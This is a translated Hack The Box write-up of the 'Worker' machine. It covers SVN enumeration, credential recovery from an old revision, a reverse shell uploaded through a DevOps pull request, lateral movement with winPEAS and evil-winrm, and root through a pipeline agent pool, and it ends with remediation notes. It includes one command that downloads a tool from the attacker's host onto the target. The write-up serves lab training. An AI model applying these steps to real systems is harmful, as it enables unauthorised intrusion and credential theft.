# HTB 工人报

> 原文：<https://infosecwriteups.com/htb-worker-writeup-74033203b785?source=collection_archive---------2----------------------->

## 问题:打开 svn 端口>错误配置的 svn 系统>无限制的文件上传>错误配置的设置

![](img/d7a3956cf4be6f6031fdb4e586a917c9.png)

# 摘要

在这台机器上，我学会了通过命令行和它的客户端应用程序从 SubVersion 控制系统开放端口 3690 检索敏感信息。

对于反向 shell，我不得不花一些时间来理解应用程序系统是如何工作的，以及这可能如何被利用。经过一些尝试和错误，我设法得到了用户的反向外壳。

故事并没有到此结束。我无法通过我得到的 shell 检索 user.txt 文件。我不得不横向升级到另一个用户来获取 user.txt 文件。在深入挖掘用户 shell 中的信息后，我终于找到了另一个用户的明文密码，我可以升级到这个密码。使用一个特殊的工具，我成功地登录到另一个用户 shell 并访问了 user.txt 散列。

**使用的工具:**

*   `nmap`
*   `dirsearch.py`查找隐藏的目录和内容
*   `svn info svn://10.10.10.203`，`svn list svn://10.10.10.203` svn 这是 subversion，是一个版本控制系统，用来跟踪文件和目录信息。
*   [aspx 反向外壳脚本](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx)
*   [Evil-winrm](https://github.com/Hackplayers/evil-winrm) 是一款 windows 远程管理工具，是一款测试工具。这用于登录用户以获取外壳。

**CVE(有):**无

# 列举

Nmap 扫描 TCP 输出

![](img/0dfc699eb6de27d6705f8b93d8111f45.png)

# 据点

*** * * * * * * * * * * *端口 3690 服务器颠覆* * * * * * * * * * * * * * * * * * * * * * * * * * ***

![](img/f57c17883d50bc896f840c2867d5c1bf.png)

在研究 svnserver 时，我遇到了一个`svn`命令，然后我用它来提取关于这个站点的有用信息。这是可能的，因为没有适当的认证。

![](img/1629c86dd74b57189ca4f95de95c78f1.png)![](img/04aa013c10064c02f1922873c5f9926f.png)

日志显示有带注释的 5r(修订)文件。

![](img/735eccda6d8814a6b4da4183f8d5f8db.png)

`svn list`命令显示了最新的 R5 信息。

![](img/67615a7a3ae03f96ff93a88859af8ad3.png)

使用`svn list`命令，我们可以看到子域名。

![](img/ecd562b93bd9c559f2873d8a67cb69a5.png)![](img/29bf48d6f3306415a0cbff215aeb478b.png)

使用名为 **smartsvnprofessional 的 svn GUI 客户端应用程序，**我检查了我们之前在 log 中看到的所有 5 个修订文件。

在这里，我还获得了对 **moved.txt** 及其内容的访问权限。

![](img/ff3889d54b717baf92e3b4c290e4433f.png)![](img/e33e75ccbb286a9bb92967b95beedae3.png)![](img/60d2f3d285a0d8950c63b46045466bbb.png)

找到一个名为 *devops.worker.htb* 的新子域名，并将其包含到我的 */etc/hosts* 文件中。

![](img/5d01ceca9e9b11be6a15010dc9ed7085.png)![](img/81e5f38f215efe9a64a855cac843dd19.png)![](img/4324d21dbab1995cfb1a58f3ea875c79.png)

访问此子域需要凭据。

![](img/ed8e1222f75600e651b2d532596da913.png)

注意之前我运行`svn log` 命令时，r2 的注释提到了*‘添加的部署脚本’*。

通过更新工作副本，将当前版本从 r5 更改为 r2，如下所示，因为我们希望从 **r2 检索**部署脚本**。**

![](img/efd2f205cf101357e08bd96cb614a4d5.png)![](img/b4cf9357f430ee07482489c14d0ed9e0.png)![](img/5b07e382ccd5318674d74e89e33275b9.png)![](img/9909246cfb5d9d95045217f3fafbdf70.png)

**问题**

现在，我使用这些凭据，尝试登录 *devops.worker.htb* 登录门户，但即使尝试了几次也没有成功。

后来，通过一些指点，我意识到我必须将“手动代理配置”改为“使用系统代理设置”，即使打嗝拦截功能已经关闭。进入 *devops.worker.htb* 的认证运行良好，我获得了立足点！！！

![](img/4e4cf2b8ea68af95bc81a7a3ab149128.png)

# 反向外壳

在花了一些时间浏览这个网站并从 HTB 社区得到一些指点后，我明白了得到反向外壳的过程。

1.  访问项目*smarthotel 360>Repos>文件>光谱>创建新分支*

![](img/7e1c9234ed0981910200b0e430899607.png)

2.由于这是在微软 Windows IIS 服务器上运行的，我上传了我下载的由 [borjmz](https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx) 编写的 aspx 反向 shell 脚本，并更改了 IP 地址和监听端口。

![](img/5bd2c9084fe17e9c0e297b04546b0a82.png)

3.上传 reverse.aspx shell 后，单击“创建拉取请求”。

![](img/563dbb570ce63d599dd889b71d56e7a9.png)

4.批准并完成合并。

![](img/cc5b2fea33451a71ca5cbf91176bb422.png)![](img/5145cc880aedc5b861653246f7956652.png)

现在，所有必需的项目都已完成，请执行步骤 5。

![](img/4a79df9451ef79ff063db2162513974a.png)

5.将***spectral . worker . htb*包含在 */etc/hosts* 文件中，并检查 url 以查看它是否工作，因为我们需要在这个子域上执行 *reverse.aspx* shell。**

**![](img/b8360c9fea8436b728d486e3688e0fcf.png)**

**6.启动主机上的监听端口并执行 shell**

**![](img/8d2598678156611bf2c28e6dbbf454df.png)****![](img/82d81912dde0d016a3741d4c1416d6a9.png)****![](img/2eaadd599c3543c37bfd9a71fc9f74c3.png)**

****用户****

**![](img/f1ac1bc2110968d413678034b03a1496.png)**

## **横向运动**

**从在 shell 上运行 powershell.exe 命令开始，这很有效！**

**运行 powerup.ps1，然后运行 Invoke-AllChecks，没有获取任何信息。**

**然后我通过 */temp* 目录下的`wget`命令下载了 winpeas.exe。**

**`wget [http://10.10.14.42/privilege-escalation-awesome-scripts-suite-master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe](http://10.10.14.42/privilege-escalation-awesome-scripts-suite-master/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe) -o winPEAS.exe`**

**![](img/bee4269e2a770043ec8983c291022ee3.png)**

**接下来，更改 winPEAS.exe 文件权限，然后将这个程序输出到文件中。**

**![](img/afee0768476a5ecd9adcb9e9e871414d.png)**

**在仔细分析了 winpeas.exe 的输出后，我发现还有另一个驱动器 **W:\****

**![](img/777ffb991c7ecd53932810e8355bbfbe.png)****![](img/d8bd76453141d3e48d7d0593d1b2a28f.png)**

**在这里，我遇到了用户和他们的信用。**

**现在回到我们之前的 C:\Users，我们看到了名称 robisl。因此，我们现在可以尝试使用找到的密码登录。**

**![](img/b10b8352a1d3f5c670b16e0847b8a745.png)**

**我被指引使用一个叫做**‘evil-winrm . Rb’**的工具，这个工具可以让我们得到用户账户的外壳。**

**![](img/74a934eb533d7ac245af1e1fd48af93e.png)****![](img/442a57e453fdde1351456c71e8864b39.png)**

****成功！！！****

**![](img/b8bc1cfd895fcd79a8eef096cf2ac31b.png)**

# **补救**

*   **关闭 svn 端口**
*   **配置版本控制系统，使旧版本文件一旦被移除/删除就无法恢复。**

# **HTB 工人根**

**错误配置的设置**

# **摘要**

**对于这一部分，我们回到找到 robisl 的密码的地方，因为`whoami /All`命令显示 robisl 也在一个经过身份验证的用户组中。因此，登录 *devops.worker.htb* 会将我们带入他的帐户。**

**项目设置被错误配置为允许管理员权限。利用这一点将获得根内容，甚至更好，外壳！**

## **权限提升**

**在这里，我们可以看到 robisl 也是 authenticated users 的成员。**

**使用 robisl 的凭据成功登录 devops.worker.htb，**

**![](img/b09ad3a3ed144751e809f2b2916810ba.png)**

**在使用 robisl 的凭证登录后，我们现在看到一个名为' **PartsUnlimited** '的不同项目。**

**与之前不同，这里创建一个分支并合并上传的内容这次显然没有成功。**

**寻找其他方法来找到有管理员权限的东西，然后利用它来获得 shell。**

**![](img/2c82ec5f7e479e88fb15ba9ad6c2234b.png)**

****错误配置问题****

**在浏览这个站点后，我发现管道代理池是由管理员拥有的。我检查了这个*管道*特性是否可以被利用来获得根。**

**![](img/04d214b9896471b81426069479569a53.png)****![](img/930a2fc094e2ca9a221f4d0cd91da36f.png)**

**对于“*检查您的管道 YAML* ”部分，我们稍微修改了这里的代码，以提取 root.txt 文件。**

**如前面从*“项目设置”页面>“代理池”*看到的，名称是**“设置”****

**![](img/4644876c5dfc5754108f496d83204e3e.png)****![](img/eb53a311a7c334458712be5c0dd81da0.png)****![](img/0076ac9ab0b75814b2519d8e5b01f989.png)****![](img/736e2e6d36305e970075481edadf6721.png)**

****成功了！！！****

## **补救**

*   **配置管道功能设置，使非特权用户无法访问。**

**![](img/91bfff53ab077387ff8315e39a1af108.png)**